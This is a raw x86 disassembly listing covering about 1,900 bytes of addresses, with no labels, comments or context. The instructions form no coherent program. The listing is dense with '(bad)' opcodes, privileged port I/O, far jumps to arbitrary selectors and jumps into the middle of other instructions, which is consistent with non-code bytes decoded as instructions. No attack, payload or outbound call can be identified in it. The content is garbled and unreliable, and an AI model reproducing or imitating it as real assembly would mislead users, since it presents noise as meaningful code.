  4997f8:	enter  0x216c,0x7f
  4997fc:	inc    ebp
  4997fd:	inc    esi
  4997fe:	aad    0x11
  499800:	mov    DWORD PTR [ebp-0xc9e0ba],0x1721614d
  49980a:	ss cs fs pusha 
  49980e:	stos   DWORD PTR es:[edi],eax
  49980f:	retf   
  499810:	pop    ds
  499811:	aaa    
  499812:	inc    edx
  499813:	fadd   DWORD PTR [edx+0x66]
  499816:	dec    ebx
  499817:	inc    DWORD PTR [edi+ebx*1-0x75]
  49981b:	fst    QWORD PTR [esi-0x70]
  49981e:	pop    es
  49981f:	(bad)  
  499820:	cmp    DWORD PTR [edi+0x42],edi
  499823:	es mov dh,0x90
  499826:	inc    ecx
  499827:	pop    ds
  499828:	inc    ecx
  499829:	cs in  al,0x25
  49982c:	in     al,0x45
  49982e:	jle    0x499872
  499830:	inc    edx
  499831:	xor    cl,BYTE PTR [ebx-0x29]
  499834:	inc    edx
  499835:	aas    
  499836:	jg     0x49986f
  499838:	dec    esp
  499839:	ins    BYTE PTR es:[edi],dx
  49983a:	and    DWORD PTR [edi],edx
  49983c:	cmp    BYTE PTR [edi],bl
  49983e:	inc    ecx
  49983f:	and    DWORD PTR [edi-0x78],edx
  499842:	test   edi,edi
  499844:	lods   al,BYTE PTR ss:[esi]
  499846:	and    al,0x13
  499848:	xor    dh,BYTE PTR [esi]
  49984a:	ss and ebx,eax
  49984d:	inc    esi
  49984e:	xchg   edi,eax
  49984f:	addr16 jg 0x499888
  499852:	mov    BYTE PTR [ebp+0x411f6c4c],al
  499858:	adc    esi,DWORD PTR [edx]
  49985a:	and    DWORD PTR [edi-0x1],edx
  49985d:	ss ss rcr BYTE PTR ss:[edx],1
  499862:	jno    0x499890
  499864:	pop    ds
  499865:	pop    esp
  499866:	enter  0xb144,0x7f
  49986a:	push   DWORD PTR [eax]
  49986c:	xor    BYTE PTR [ebx],cl
  49986e:	mov    ecx,0xff3085d8
  499873:	xor    eax,0x90b8e835
  499878:	xor    eax,0x5c851f35
  49987d:	enter  0xff40,0x36
  499881:	ss pop ss
  499883:	xor    bl,BYTE PTR [ebx-0x38]
  499886:	ss jg  0x4998bc
  499889:	xor    edi,DWORD PTR [edx+0x33217216]
  49988f:	aas    
  499890:	jb     0x4998b3
  499892:	pop    ss
  499893:	aad    0xff
  499895:	ss ss enter 0x216c,0x17
  49989b:	ss jg  0x4998cf
  49989e:	pop    edx
  49989f:	enter  0x5c85,0x31
  4998a3:	xor    DWORD PTR [ecx],esp
  4998a5:	add    edx,DWORD PTR [ebp-0x1e]
  4998a8:	aas    
  4998a9:	push   DWORD PTR ds:0x72172172
  4998af:	xor    eax,0x85c83535
  4998b4:	int3   
  4998b5:	push   ss
  4998b6:	jg     0x4998fe
  4998b8:	inc    esi
  4998b9:	fs xchg esi,eax
  4998bb:	loop   0x499917
  4998bd:	aas    
  4998be:	inc    DWORD PTR [ebx+0x2e]
  4998c1:	in     al,0x42
  4998c3:	cs inc ebx
  4998c5:	inc    ebx
  4998c6:	inc    esp
  4998c7:	or     ebx,DWORD PTR [ecx+0x411f42d8]
  4998cd:	fcom   QWORD PTR [esi-0x50]
  4998d0:	nop
  4998d1:	inc    ebp
  4998d2:	pop    es
  4998d3:	inc    DWORD PTR [ecx-0x7b]
  4998d6:	pop    esp
  4998d7:	enter  0x4185,0x41
  4998db:	and    DWORD PTR [ebx],edx
  4998dd:	pop    ebx
  4998de:	enter  0x1f42,0x41
  4998e2:	cwde   
  4998e3:	mov    ds:0x85457216,al
  4998e8:	dec    esp
  4998e9:	push   esp
  4998ea:	xor    DWORD PTR [edi-0x1],0x35
  4998ee:	mov    bl,0x85
  4998f0:	pop    esp
  4998f1:	enter  0x3535,0x7f
  4998f5:	cmp    DWORD PTR [ecx],esp
  4998f7:	pop    ss
  4998f8:	jb     0x49991b
  4998fa:	cmp    DWORD PTR [ecx],edi
  4998fc:	mov    bl,0x10
  4998fe:	and    eax,0xff7f4174
  499903:	and    DWORD PTR ss:[edi],edx
  499906:	jb     0x499929
  499908:	ss aaa 
  49990a:	enter  0x4c85,0x6c
  49990e:	pop    ds
  49990f:	inc    ecx
  499910:	inc    ebp
  499911:	sub    al,0x45
  499913:	add    al,0x5c
  499915:	xor    bl,BYTE PTR [edi-0x1]
  499918:	enter  0x5c85,0xc8
  49991c:	xor    al,0x34
  49991e:	xor    eax,0x5b12215c
  499923:	pop    ds
  499924:	push   DWORD PTR ds:0x84c88e81
  49992a:	xor    eax,0xb90b91f
  49992f:	imul   edi,esi,0x2b333232
  499935:	inc    esp
  499936:	bound  ecx,QWORD PTR [ebx]
  499938:	pop    ds
  499939:	call   FWORD PTR [ebx+0x29]
  49993c:	cdq    
  49993d:	nop
  49993e:	xor    eax,0xd513235
  499943:	es dec edi
  499945:	push   DWORD PTR ds:0x17217216
  49994b:	xor    eax,0x85c85c35
  499950:	int3   
  499951:	jg     0x499984
  499953:	xor    DWORD PTR [edx],esi
  499955:	stos   BYTE PTR es:[edi],al
  499956:	ror    DWORD PTR [ecx+0x2eff9f85],0xe4
  49995d:	inc    edx
  49995e:	push   es
  49995f:	xor    al,0x34
  499961:	xor    al,0x9b
  499963:	sub    eax,0x7f3442e4
  499968:	inc    esi
  499969:	jmp    DWORD PTR [eax]
  49996b:	push   0x32301721
  499970:	push   ecx
  499971:	lods   eax,DWORD PTR ds:[esi]
  499972:	or     BYTE PTR [edi+0x721634ff],bl
  499978:	and    DWORD PTR [edi],edx
  49997a:	xor    al,0x34
  49997c:	pop    ebx
  49997d:	enter  0xcc85,0x7f
  499981:	inc    esp
  499982:	inc    ebp
  499983:	pop    ds
  499984:	nop
  499985:	fisttp DWORD PTR [edx]
  499987:	adc    al,BYTE PTR [edi]
  499989:	inc    DWORD PTR [ecx-0x47]
  49998c:	nop
  49998d:	or     edi,DWORD PTR [ecx+0x17424242]
  499993:	jb     0x499946
  499995:	or     eax,DWORD PTR [edx+0x7f]
  499998:	inc    ebx
  499999:	inc    ebx
  49999a:	cdq    
  49999b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49999c:	imul   esp,DWORD PTR [ecx],0x3f
  49999f:	(bad)  
  4999a0:	cmp    BYTE PTR [ebx],cl
  4999a2:	mov    ecx,0x39390b90
  4999a7:	and    DWORD PTR [edi],edx
  4999a9:	mov    ebx,0x7f393990
  4999ae:	inc    ecx
  4999af:	xchg   ebp,eax
  4999b0:	mov    eax,0x3f417216
  4999b5:	test   DWORD PTR [eax+ecx*8+0x40],ebx
  4999b9:	push   DWORD PTR [esp+esi*1]
  4999bc:	mov    bl,0x85
  4999be:	pop    esp
  4999bf:	enter  0x3434,0x7f
  4999c3:	cmp    BYTE PTR [eax+0x38217216],bh
  4999c9:	aas    
  4999ca:	bound  ecx,QWORD PTR [ebx]
  4999cc:	cdq    
  4999cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4999ce:	jg     0x499a05
  4999d0:	pop    ds
  4999d1:	mov    ecx,0x41642c42
  4999d6:	push   DWORD PTR [ecx+edx*1]
  4999d9:	cdq    
  4999da:	nop
  4999db:	or     DWORD PTR [esp+esi*1],esi
  4999de:	nop
  4999df:	sub    DWORD PTR [edx],0x34ff1fd0
  4999e5:	mov    dh,0x90
  4999e7:	or     edi,DWORD PTR [ecx-0x1b80cbcc]
  4999ed:	inc    edx
  4999ee:	cs fs xor al,0x34
  4999f2:	xor    al,0xa8
  4999f4:	(bad)  
  4999f5:	inc    ebp
  4999f6:	sub    eax,0x90b9ff5f
  4999fb:	or     ebx,DWORD PTR [ecx-0x1bcbcbcc]
  499a01:	inc    edx
  499a02:	or     di,WORD PTR [edi+0x32]
  499a06:	xor    dl,BYTE PTR [edx]
  499a08:	xlat   BYTE PTR ds:[ebx]
  499a09:	inc    edx
  499a0a:	xor    bh,BYTE PTR cs:[edi]
  499a0d:	nop
  499a0e:	or     ebx,DWORD PTR [ecx]
  499a10:	test   al,0xff
  499a12:	xor    esi,DWORD PTR [ebx]
  499a14:	inc    edx
  499a15:	cs in  al,0xbb
  499a18:	xor    edi,edi
  499a1a:	inc    esi
  499a1b:	xor    bh,dl
  499a1d:	inc    edx
  499a1e:	cs in  al,0x30
  499a21:	xor    BYTE PTR [edi],bh
  499a23:	ins    BYTE PTR es:[edi],dx
  499a24:	and    DWORD PTR [ebx+0x1f44ff14],esi
  499a2a:	push   edi
  499a2b:	mov    BYTE PTR [ebp+0x33ff454c],al
  499a31:	and    DWORD PTR [ebx],edx
  499a33:	xor    ah,BYTE PTR [ecx]
  499a35:	xor    esi,DWORD PTR [ebx]
  499a37:	stos   DWORD PTR es:[edi],eax
  499a38:	sbb    dl,BYTE PTR [edx]
  499a3a:	xor    BYTE PTR [ebx],dh
  499a3c:	xlat   BYTE PTR ds:[ebx]
  499a3d:	mov    DWORD PTR [ebp+0x1f2f5026],eax
  499a43:	mov    ecx,0x5f156f90
  499a48:	pop    ds
  499a49:	xor    eax,0x9031b339
  499a4e:	or     eax,DWORD PTR [ebx+eax*1+0x74]
  499a52:	fcmovbe st,st(6)
  499a54:	(bad)  
  499a56:	pop    ebp
  499a58:	cs inc esi
  499a5a:	sub    esp,DWORD PTR [edi-0x37a3e0bc]
  499a60:	mov    bh,0x8a
  499a62:	pop    edi
  499a63:	pop    ds
  499a64:	xor    eax,0xce922239
  499a69:	test   DWORD PTR [ebx+edi*8+0x60],eax
  499a6d:	xor    BYTE PTR [esi],ch
  499a6f:	xor    BYTE PTR [edi-0x41],ah
  499a72:	inc    edx
  499a73:	cs fs mov dh,0xff
  499a77:	inc    ebx
  499a78:	inc    esp
  499a79:	nop
  499a7a:	or     ebx,DWORD PTR [ecx+0x44391fd8]
  499a80:	rcr    dl,cl
  499a82:	xchg   ebx,eax
  499a83:	mov    ah,0x43
  499a85:	jg     0x499a67
  499a87:	adc    al,BYTE PTR [edx]
  499a89:	xchg   ebp,eax
  499a8a:	(bad)  
  499a8b:	mov    edi,0xe4264265
  499a90:	xor    BYTE PTR [eax],dh
  499a92:	xor    BYTE PTR [ecx],ah
  499a94:	pop    ss
  499a95:	jb     0x499a48
  499a97:	jg     0x499adb
  499a99:	inc    ebx
  499a9a:	jl     0x499a29
  499a9c:	mov    BYTE PTR [esi+0x1e],ch
  499a9f:	daa    
  499aa0:	mov    ebx,0x2d9156f9
  499aa5:	out    0x37,eax
  499aa7:	xor    dl,BYTE PTR [ebp-0x5e]
  499aaa:	jo     0x499ab7
  499aac:	and    ch,BYTE PTR [edi+0x2f4840d8]
  499ab2:	pop    ss
  499ab3:	repz cs mov dh,0x2a
  499ab7:	xchg   ecx,eax
  499ab8:	lahf   
  499ab9:	inc    DWORD PTR [ecx-0x52]
  499abc:	inc    ecx
  499abd:	(bad)  
  499abe:	inc    eax
  499abf:	aaa    
  499ac0:	xor    BYTE PTR [eax],ch
  499ac2:	jno    0x499ac4
  499ac4:	pop    edx
  499ac5:	mov    bh,0xcb
  499ac7:	rol    BYTE PTR [ecx],cl
  499ac9:	mov    cl,0x8f
  499acb:	push   ebx
  499acc:	(bad)  
  499acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499ace:	sub    eax,0xcfefaf74
  499ad3:	xor    DWORD PTR ds:0x34970b90,0x37
  499ada:	adc    dl,bl
  499adc:	or     eax,0xb62bc76a
  499ae1:	pusha  
  499ae2:	xor    DWORD PTR [edi],ebp
  499ae4:	pop    es
  499ae5:	lahf   
  499ae6:	rol    edx,0x96
  499ae9:	add    BYTE PTR [edi],dh
  499aeb:	lahf   
  499aec:	hlt    
  499aed:	add    al,0x21
  499aef:	adc    al,0x1f
  499af1:	jg     0x499afe
  499af3:	test   eax,0x411f32a3
  499af8:	pop    ss
  499af9:	mov    eax,es:0x329f63b5
  499aff:	mov    bh,0x6d
  499b01:	mov    ds:0x7ef6835,eax
  499b06:	fbld   TBYTE PTR [ebp-0x3877585c]
  499b0c:	xor    al,0x59
  499b0e:	pop    eax
  499b0f:	and    DWORD PTR [eax],ebp
  499b11:	xchg   DWORD PTR [eax+0x23],ebx
  499b14:	mov    ah,0xa
  499b16:	dec    edi
  499b17:	mov    DWORD PTR [ecx-0x30],0x344fe648
  499b1e:	lds    esi,FWORD PTR [ecx+esi*4]
  499b21:	jmp    0xaac5:0x894fbb77
  499b28:	bound  edx,QWORD PTR [edi]
  499b2a:	push   0xffffff89
  499b2c:	rcr    BYTE PTR [edx+0x35],0x87
  499b30:	ret    
  499b31:	dec    edx
  499b32:	les    edx,FWORD PTR [edx-0x1cb928b2]
  499b38:	push   es
  499b39:	mov    DWORD PTR [ecx],edx
  499b3b:	iret   
  499b3c:	jg     0x499bb8
  499b3e:	mov    al,0x12
  499b40:	add    al,0xb7
  499b42:	(bad)  
  499b43:	mov    eax,ds:0xef511461
  499b48:	pop    ss
  499b49:	(bad)  
  499b4a:	lods   eax,DWORD PTR ds:[esi]
  499b4b:	outs   dx,DWORD PTR ds:[esi]
  499b4c:	add    ah,bl
  499b4e:	sbb    ecx,ecx
  499b50:	lods   eax,DWORD PTR ds:[esi]
  499b51:	dec    edx
  499b52:	es pop ss
  499b54:	pop    es
  499b55:	or     bl,ah
  499b57:	or     al,BYTE PTR [ecx+0x67]
  499b5a:	xor    esp,DWORD PTR [eax-0x6f]
  499b5d:	cmc    
  499b5e:	push   edx
  499b5f:	pop    ds
  499b60:	sbb    ebx,DWORD PTR [edi-0x4e2a5fdb]
  499b66:	out    dx,eax
  499b67:	(bad)  
  499b68:	das    
  499b69:	mov    WORD PTR [eax],cs
  499b6b:	(bad)  
  499b6c:	inc    edx
  499b6d:	mov    edi,0xaed8c577
  499b72:	jge    0x499bb3
  499b74:	push   edi
  499b75:	inc    ecx
  499b76:	das    
  499b77:	out    0xc1,eax
  499b79:	pop    ebx
  499b7a:	shl    DWORD PTR [eax+0x6b37322f],0x1f
  499b81:	sar    DWORD PTR [edx],0x56
  499b84:	jb     0x499bb8
  499b86:	pop    ds
  499b87:	aas    
  499b88:	js     0x499bdd
  499b8a:	imul   ebx,DWORD PTR [eax],0x17
  499b8d:	push   cs
  499b8e:	repnz pusha 
  499b90:	push   ebp
  499b91:	adc    bh,BYTE PTR [edi]
  499b93:	dec    edi
  499b94:	xor    ah,BYTE PTR [ecx+0x0]
  499b97:	rcl    DWORD PTR [ecx],0x31
  499b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499b9b:	push   esi
  499b9c:	and    DWORD PTR [ecx-0x7c],0xb6065fbf
  499ba3:	xchg   ebp,eax
  499ba4:	xchg   edx,eax
  499ba5:	scas   eax,DWORD PTR es:[edi]
  499ba6:	xlat   BYTE PTR ds:[ebx]
  499ba7:	jbe    0x499bf3
  499ba9:	dec    eax
  499baa:	test   BYTE PTR [edi],dh
  499bac:	daa    
  499bad:	(bad)  
  499bae:	jo     0x499bd1
  499bb0:	rcr    edi,cl
  499bb2:	xor    dh,BYTE PTR [edx]
  499bb4:	fbld   TBYTE PTR [eax-0x4c]
  499bb7:	jmp    0x499b93
  499bb9:	daa    
  499bba:	jg     0x499c02
  499bbc:	inc    edi
  499bbd:	push   eax
  499bbe:	mov    ebp,0x2f4715b1
  499bc3:	(bad)  
  499bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499bc5:	mov    ah,0x6d
  499bc7:	sub    BYTE PTR [eax+0x57],bl
  499bca:	inc    esi
  499bcb:	pop    edi
  499bcc:	iret   
  499bcd:	cmp    al,0x18
  499bcf:	arpl   WORD PTR ds:0x396f6e03,bp
  499bd5:	push   ebx
  499bd6:	mov    eax,ds:0x323f816b
  499bdb:	adc    al,0xa4
  499bdd:	pop    ebp
  499bde:	inc    edi
  499bdf:	inc    edi
  499be1:	xor    esp,DWORD PTR [ecx+0x18]
  499be4:	in     eax,dx
  499be5:	push   esi
  499be6:	pop    esi
  499be7:	jg     0x499bb8
  499be9:	add    eax,0x7f6c3118
  499bee:	pop    ds
  499bef:	inc    edi
  499bf0:	push   edx
  499bf1:	add    al,0xab
  499bf3:	pusha  
  499bf4:	fild   QWORD PTR [edi-0x5913eefd]
  499bfa:	fbld   TBYTE PTR [edi]
  499bfc:	xor    eax,0x205848ac
  499c01:	fisttp WORD PTR [ebx+0x170eb02a]
  499c07:	outs   dx,DWORD PTR ds:[esi]
  499c08:	ins    DWORD PTR es:[edi],dx
  499c09:	adc    al,0x60
  499c0b:	add    eax,0x2acf6f77
  499c10:	gs jmp 0x5950bf76
  499c16:	and    edx,DWORD PTR [edx+0x249ab7b4]
  499c1c:	push   cs
  499c1d:	push   ss
  499c1e:	aas    
  499c1f:	jnp    0x499bff
  499c21:	ficomp DWORD PTR [ecx+0x45bf9fa5]
  499c27:	xlat   BYTE PTR ds:[ebx]
  499c28:	pop    ss
  499c29:	mov    ah,0x51
  499c2b:	ret    
  499c2c:	cmp    bh,BYTE PTR [edi-0x1]
  499c2f:	add    ebp,DWORD PTR [eax-0x77]
  499c32:	xchg   esi,eax
  499c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  499c34:	das    
  499c35:	mov    edi,0x5523316e
  499c3a:	ret    
  499c3b:	push   0xffffffe7
  499c3d:	pop    edi
  499c3e:	push   ecx
  499c3f:	mov    al,0x15
  499c41:	mov    DWORD PTR [edi],ebx
  499c43:	dec    edi
  499c44:	mov    edi,0x8930ab0c
  499c49:	mov    bh,0xbf
  499c4b:	push   0xd
  499c4d:	add    BYTE PTR [edx+0x67],0xb2
  499c51:	inc    edx
  499c52:	push   ebp
  499c53:	test   al,0x27
  499c55:	out    dx,eax
  499c56:	fld    QWORD PTR [edx]
  499c58:	sbb    ch,bl
  499c5a:	xchg   edi,ebp
  499c5c:	dec    edi
  499c5d:	xor    al,0x57
  499c5f:	fcomp  DWORD PTR [eax+0x21]
  499c62:	addr16 inc ecx
  499c64:	cmp    al,dh
  499c66:	mov    ds:0xb5174700,al
  499c6b:	push   eax
  499c6c:	xchg   esp,eax
  499c6d:	jmp    0x111a:0xd9ffff4f
  499c74:	pusha  
  499c75:	add    DWORD PTR [bx],edx
  499c78:	bound  ebp,QWORD PTR [ebx-0x5df5c0f9]
  499c7e:	and    ecx,DWORD PTR [eax]
  499c80:	mov    eax,ds:0x6877b75f
  499c85:	pop    eax
  499c86:	pop    es
  499c87:	xor    ecx,DWORD PTR es:[edi+0x26a6d447]
  499c8e:	fadd   DWORD PTR [edi+0x4303a739]
  499c94:	add    al,0x48
  499c96:	pop    es
  499c97:	xor    eax,0xab0c56ac
  499c9c:	pop    es
  499c9d:	pmaxub mm5,QWORD PTR ds:0xdf022390
  499ca4:	ss add ecx,eax
  499ca7:	push   ecx
  499ca8:	inc    eax
  499ca9:	daa    
  499caa:	inc    ebx
  499cab:	addr16 push 0xffffffac
  499cae:	pusha  
  499caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499cb0:	outs   dx,BYTE PTR ds:[esi]
  499cb1:	out    dx,eax
  499cb2:	dec    edi
  499cb3:	inc    esp
  499cb4:	sub    BYTE PTR [ebp-0x2b],0x67
  499cb8:	call   FWORD PTR [edi+0x15]
  499cbb:	pop    eax
  499cbc:	xchg   ecx,eax
  499cbd:	pop    ebx
  499cbe:	xchg   edi,eax
  499cbf:	daa    
  499cc0:	(bad)  
  499cc1:	mov    ds:0xff586ae0,eax
  499cc6:	xor    al,0xf
  499cc8:	stos   DWORD PTR es:[edi],eax
  499cc9:	retf   
  499cca:	rcl    BYTE PTR [edx-0x553f20cf],0x42
  499cd1:	add    eax,0x6c4376f
  499cd6:	adc    BYTE PTR [eax-0x61],ch
  499cd9:	lahf   
  499cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  499cdb:	add    eax,0x6aa75844
  499ce0:	xor    eax,0xaff724ec
  499ce5:	or     ebp,DWORD PTR [ecx-0x712448e8]
  499ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499cec:	push   edx
  499ced:	ins    BYTE PTR es:[edi],dx
  499cee:	loopne 0x499c9a
  499cf0:	pop    DWORD PTR [edi+edi*1+0x63]
  499cf4:	xor    eax,0x87dfb0ec
  499cf9:	adc    al,0x2d
  499cfb:	in     al,0x88
  499cfd:	addr16 aaa 
  499cff:	daa    
  499d00:	push   esp
  499d01:	jo     0x499d73
  499d03:	and    edx,DWORD PTR [edi]
  499d05:	xor    eax,0x822a44e7
  499d0a:	jae    0x499d40
  499d0c:	jg     0x499d68
  499d0e:	or     ecx,DWORD PTR [ebx+eiz*2]
  499d11:	(bad)  
  499d12:	cmova  esi,DWORD PTR [eax+ebp*4-0x3b]
  499d17:	push   es
  499d18:	not    WORD PTR [edi]
  499d1b:	jbe    0x499d77
  499d1d:	mov    eax,0xdf56efd0
  499d22:	xor    dl,BYTE PTR ds:0x27e70aad
  499d28:	xor    ch,BYTE PTR [eax+eax*2+0x13]
  499d2c:	inc    esi
  499d2d:	not    DWORD PTR [edi+0x21]
  499d30:	cmp    dl,BYTE PTR es:[edx+0x4f]
  499d34:	inc    ebp
  499d35:	mul    DWORD PTR [eax]
  499d37:	push   esi
  499d38:	pop    esp
  499d39:	dec    eax
  499d3a:	jg     0x499d9d
  499d3c:	mov    ah,0xa3
  499d3e:	push   eax
  499d3f:	pop    edi
  499d40:	inc    edx
  499d41:	xchg   edi,eax
  499d42:	lahf   
  499d43:	add    BYTE PTR [esi-0x39],al
  499d46:	out    0xe7,al
  499d48:	pop    edi
  499d49:	or     BYTE PTR [ebp-0x5d],bl
  499d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  499d4d:	cmp    DWORD PTR [edi],esp
  499d4f:	aas    
  499d50:	(bad)  
  499d51:	leave  
  499d52:	test   DWORD PTR [edi+ebp*2-0x25bebdcd],esi
  499d59:	call   0xc17f:0x9f2f6290
  499d60:	push   ebp
  499d61:	jo     0x499cf7
  499d63:	outs   dx,DWORD PTR ds:[esi]
  499d64:	lahf   
  499d65:	inc    ebp
  499d66:	aas    
  499d67:	sbb    eax,0xbf063717
  499d6c:	inc    edx
  499d6d:	pop    es
  499d6e:	aam    0x41
  499d70:	or     DWORD PTR [edi+0x32],edx
  499d73:	pop    ss
  499d74:	adc    DWORD PTR [ecx-0x4d],esp
  499d77:	test   BYTE PTR [edi-0x19eebd49],ah
  499d7d:	pop    eax
  499d7e:	jg     0x499db6
  499d80:	mov    bh,0xb0
  499d82:	sub    bl,BYTE PTR [edx+0x15]
  499d85:	ja     0x499d46
  499d87:	sbb    BYTE PTR ds:0xfea751ab,cl
  499d8d:	out    0x16,eax
  499d8f:	in     eax,dx
  499d90:	add    ch,BYTE PTR [ebx]
  499d92:	ja     0x499d93
  499d94:	mov    bh,0xd4
  499d96:	xor    BYTE PTR [edx+0x1b],ch
  499d99:	maskmovq mm7,(bad)
  499d9a:	idiv   DWORD PTR [edi]
  499d9c:	rcr    BYTE PTR [edx-0x66],cl
  499d9f:	xor    DWORD PTR [ebx+0x7f],eax
  499da2:	daa    
  499da3:	push   ecx
  499da4:	mov    WORD PTR [ecx+ebx*1+0x609ff20f],?
  499dab:	xor    al,0x0
  499dad:	sbb    ch,bh
  499daf:	and    ebx,DWORD PTR [edx]
  499db1:	push   ds
  499db2:	ss (bad) 
  499db4:	scas   eax,DWORD PTR es:[edi]
  499db5:	aas    
  499db6:	sub    BYTE PTR [esi+0x3ff2561a],cl
  499dbc:	ss pop ss
  499dbe:	xor    BYTE PTR [edx-0x41],ch
  499dc1:	mov    cl,0xf
  499dc3:	xor    ebp,DWORD PTR [edi+0x60]
  499dc6:	push   esp
  499dc7:	ret    
  499dc8:	or     ah,BYTE PTR [edi]
  499dca:	outs   dx,DWORD PTR ds:[esi]
  499dcb:	xchg   edx,eax
  499dcc:	arpl   WORD PTR [ebx],cx
  499dce:	push   esi
  499dcf:	out    dx,eax
  499dd0:	pop    es
  499dd1:	test   DWORD PTR [ebp+0x46],0xb7b0c4c3
  499dd8:	fbstp  TBYTE PTR ss:[esi+eax*1]
  499ddc:	xor    eax,0x416fba1c
  499de1:	xor    BYTE PTR [edx+0x4c],bl
  499de4:	pcmpeqd mm3,QWORD PTR [edi]
  499de7:	push   esp
  499de8:	lds    eax,FWORD PTR [ecx-0x3b]
  499deb:	push   DWORD PTR ss:[edi+eiz*2]
  499def:	les    edx,FWORD PTR [esi+0x6c]
  499df2:	pusha  
  499df3:	test   edi,0x22016069
  499df9:	push   ss
  499dfa:	ins    BYTE PTR es:[edi],dx
  499dfb:	adc    al,0x3b
  499dfd:	mov    edx,0x7ff745d7
  499e02:	ficomp DWORD PTR [edx]
  499e04:	xchg   BYTE PTR [esi+eax*2+0xf],cl
  499e08:	test   DWORD PTR [edx-0x61cb12e5],0xb0ef0af7
  499e12:	inc    ebx
  499e13:	shl    BYTE PTR [eax+0x6ab685f],0xd6
  499e1a:	iret   
  499e1b:	scas   eax,DWORD PTR es:[edi]
  499e1c:	push   edi
  499e1d:	sbb    dh,BYTE PTR [esi+eax*4+0x20ebfec0]
  499e24:	sub    BYTE PTR [ebx+0x2acf4567],0x45
  499e2b:	or     eax,0xa107675a
  499e30:	push   esi
  499e31:	sub    DWORD PTR [edi-0x57a6cea1],eax
  499e37:	sbb    al,BYTE PTR [ebp+0x57]
  499e3a:	aaa    
  499e3b:	dec    DWORD PTR [eax+0xe]
  499e3e:	mov    ecx,0x31383892
  499e43:	mov    al,0xe4
  499e45:	sub    BYTE PTR [ecx],bh
  499e47:	cmp    BYTE PTR [ecx],dh
  499e49:	mov    edx,DWORD PTR [edx+0x377fbad4]
  499e4f:	push   ebp
  499e50:	mov    eax,ds:0x4f33b161
  499e55:	dec    edi
  499e56:	dec    ecx
  499e58:	adc    DWORD PTR [edx-0x4f],esi
  499e5b:	push   DWORD PTR [esi]
  499e5d:	xor    BYTE PTR [edi],ah
  499e5f:	push   esi
  499e60:	mov    ah,0xda
  499e62:	xor    ch,BYTE PTR [edi-0x2aa770d9]
  499e68:	mov    eax,0x6d8f0e50
  499e6d:	sub    al,0x92
  499e6f:	and    ebp,DWORD PTR [edi+0x34]
  499e72:	xchg   edx,eax
  499e73:	pop    eax
  499e74:	jae    0x499e91
  499e76:	pop    ds
  499e77:	jg     0xadec835d
  499e7d:	xchg   DWORD PTR [edi+0x32],edi
  499e80:	xor    ah,BYTE PTR [edi]
  499e82:	inc    edx
  499e83:	aad    0xa0
  499e85:	seta   BYTE PTR [edi+0x15ac58ea]
  499e8c:	(bad)  
  499e8d:	pop    ds
  499e8e:	lea    eax,[ecx]
  499e90:	xor    esi,ebx
  499e92:	aas    
  499e93:	cmpxchg BYTE PTR [eax-0x55],bl
  499e97:	xor    BYTE PTR [edi-0x77ba522d],0x54
  499e9e:	movhps QWORD PTR ds:0x32608069,xmm1
  499ea5:	outs   dx,DWORD PTR ds:[esi]
  499ea6:	inc    ebp
  499ea7:	dec    esp
  499ea8:	push   edx
  499ea9:	test   DWORD PTR [ebp+0x3f],eax
  499eac:	scas   al,BYTE PTR es:[edi]
  499ead:	xor    eax,0x6aad4944
  499eb2:	xor    eax,0x5f214fb7
  499eb7:	inc    ebx
  499eb8:	and    DWORD PTR [edi+0x41],0xc4ea456e
  499ebf:	cmp    dl,BYTE PTR [esi+0x1f]
  499ec2:	jg     0x499e5c
  499ec4:	je     0x499ed8
  499ec6:	mov    al,0xa7
  499ec8:	xor    DWORD PTR [ebx],ecx
  499eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499ecb:	outs   dx,BYTE PTR ds:[esi]
  499ecc:	mov    edi,esi
  499ece:	push   esi
  499ecf:	pop    edx
  499ed0:	adc    eax,0x7f339229
  499ed5:	dec    ebp
  499ed6:	or     edx,DWORD PTR [esi+0xb]
  499ed9:	das    
  499eda:	aas    
  499edb:	pop    edi
  499edc:	mov    al,0x5
  499ede:	mov    dh,0x52
  499ee0:	aas    
  499ee1:	pop    edi
  499ee2:	pop    ebx
  499ee3:	ret    
  499ee4:	inc    ebp
  499ee5:	xor    dh,BYTE PTR [edx]
  499ee7:	xor    al,0xf
  499ee9:	jg     0x499f3c
  499eeb:	repnz sbb al,0x32
  499eee:	cmp    BYTE PTR [ebp+0x37],al
  499ef1:	loopne 0x499f15
  499ef3:	cmp    eax,ebx
  499ef5:	cmp    edi,ebx
  499ef7:	xor    eax,0xa1189030
  499efc:	mov    ebx,DWORD PTR [edi+0x747734]
  499f02:	lds    edx,FWORD PTR [edi+edi*8+0x36]
  499f06:	aas    
  499f07:	inc    ecx
  499f08:	call   0x396f:0x7f9b09aa
  499f0f:	dec    eax
  499f10:	push   ecx
  499f11:	jmp    0x97aca703
  499f16:	add    bl,al
  499f18:	arpl   WORD PTR [ebx-0x20c9a801],di
  499f1e:	push   ss
  499f1f:	and    al,0xa
  499f21:	jno    0x499f53
  499f23:	lahf   
  499f24:	pop    es
  499f25:	jb     0x499f14
  499f27:	imul   edx,eax,0xffffffe7
  499f2a:	aaa    
  499f2b:	out    0x34,eax
  499f2d:	jno    0x499eeb
  499f2f:	add    DWORD PTR [ebp+0x36],0x3412ab87
  499f36:	add    dl,BYTE PTR [edi]
  499f38:	push   ss
  499f39:	leave  
  499f3a:	ror    DWORD PTR [esi],0xf2
  499f3d:	out    0x36,eax
  499f3f:	or     eax,DWORD PTR [edi]
  499f41:	jno    0x499f5f
  499f43:	(bad)  
  499f44:	das    
  499f45:	ss or  eax,0x1fb01055
  499f4b:	(bad)  
  499f4c:	xor    al,BYTE PTR [edx]
  499f4e:	ins    DWORD PTR es:[edi],dx
  499f4f:	pop    es
  499f50:	xor    eax,0xdfbf43bf
  499f55:	push   es
  499f56:	sub    DWORD PTR [esp+ebp*4+0x6f],0x2a9058a8
  499f5e:	iret   
  499f5f:	pop    es
